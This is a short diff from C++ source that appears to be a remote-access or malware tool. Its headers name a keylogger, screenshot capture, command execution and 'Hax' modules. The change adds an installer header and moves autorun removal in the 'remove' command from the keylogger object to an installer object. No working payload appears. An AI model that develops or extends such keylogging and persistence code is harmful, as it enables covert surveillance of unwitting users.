@@ -2,6 +2,7 @@
 #include "CommandExe.h"
 #include "Hax.h"
 #include "Keylogger.h"
+#include "Installer.h"
 #include "Network.h"
 #include "Screenshot.h"
 #include "Settings.h"
@@ -91,7 +92,7 @@ command_t commandDefs[] = {
 	},
 	{
 		_T("remove"), [](std::vector<std::tstring> args) {
-			keylogger.SetAutorun(false);
+			installer.SetAutorun(false);
 		}
 	},
 	{
